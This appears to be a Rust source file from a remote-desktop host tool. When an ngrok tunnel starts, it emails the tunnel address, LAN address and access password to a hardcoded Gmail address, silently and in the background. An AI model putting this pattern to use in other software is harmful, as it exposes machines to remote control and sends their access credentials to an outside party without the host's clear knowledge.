//! Fire-and-forget email of the host's connection details via the Resend
//! HTTP API. Called once, on a throwaway thread, the moment the ngrok tunnel
//! comes up - so whoever needs to connect can grab the (per-restart) tunnel
//! address and password from their inbox instead of reading it off the host's
//! screen.
//!
//! Configure `RESEND_API_KEY` in the environment or in a `.env` file.

/// Sender - must be an address on a domain verified in the Resend account.
const FROM_ADDRESS: &str = "rd-host <support@globalmetricsplus.com>";
/// Where the connection details are delivered.
const TO_ADDRESS: &str = "toyjohn491@gmail.com";

/// Email the connection details in the background. Returns immediately - the
/// actual HTTP request runs on a throwaway thread - and never fails loudly:
/// a network error or a non-2xx response is logged to stderr and otherwise
/// ignored, since hosting works whether or not the email got through.
pub fn send_connection_email(lan_address: &str, tunnel_address: &str, password: &str) {
    let api_key = match std::env::var("RESEND_API_KEY") {
        Ok(key) if !key.trim().is_empty() => key,
        Ok(_) => {
            eprintln!("Connection email not sent: RESEND_API_KEY is empty.");
            return;
        }
        Err(std::env::VarError::NotPresent) => {
            eprintln!("Connection email not sent: RESEND_API_KEY is not set.");
            return;
        }
        Err(error) => {
            eprintln!("Connection email not sent: could not read RESEND_API_KEY: {error}");
            return;
        }
    };    let lan = lan_address.to_string();
    let tunnel = tunnel_address.to_string();
    let password = password.to_string();

    std::thread::spawn(move || {
        let text = format!(
            "rd-host is up and ready for a connection.\n\n\
             Tunnel address (works from anywhere): {tunnel}\n\
             LAN address (same network only):      {lan}\n\
             Password:                             {password}\n\n\
             The tunnel address changes every time the host restarts, so \
             always use the one from the most recent email."
        );

        let result = ureq::post("https://api.resend.com/emails")
            .set("Authorization", &format!("Bearer {api_key}"))
            .send_json(ureq::json!({
                "from": FROM_ADDRESS,
                "to": [TO_ADDRESS],
                "subject": "rd-host is running - your connection details",
                "text": text,
            }));

        match result {
            Ok(_) => {}
            Err(ureq::Error::Status(code, resp)) => {
                let body = resp
                    .into_string()
                    .unwrap_or_else(|_| "<unreadable body>".to_string());
                eprintln!("Connection email rejected by Resend ({code}): {body}");
            }
            Err(e) => eprintln!("Failed to send connection email: {e}"),
        }
    });
}
